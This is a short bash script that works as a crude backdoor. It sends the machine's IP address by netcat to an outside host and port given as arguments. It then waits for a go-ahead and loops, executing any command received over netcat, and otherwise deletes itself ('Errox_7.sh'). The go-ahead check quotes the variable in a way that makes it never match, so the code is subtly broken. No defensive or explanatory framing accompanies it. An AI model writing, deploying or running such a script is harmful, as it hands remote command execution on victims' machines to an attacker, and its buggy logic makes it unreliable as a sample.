#!/bin/bash
host=$1
echo "$(ip a | grep -E 'inet +[0-9]+.+[0-9]+.+[0-9]+.+[0-9]+/+[0-9]+ brd' | awk '{print $2}' | grep -oE '^[^/]+')" | nc -q 1 $host $2
response=$(nc -l -p $2)
if [[ '$response' == 'true' ]]; then
while true; do
echo 'waiting for command.'
command=$(nc -l -p $2)
$command
done
else
rm "Errox_7.sh"
fi
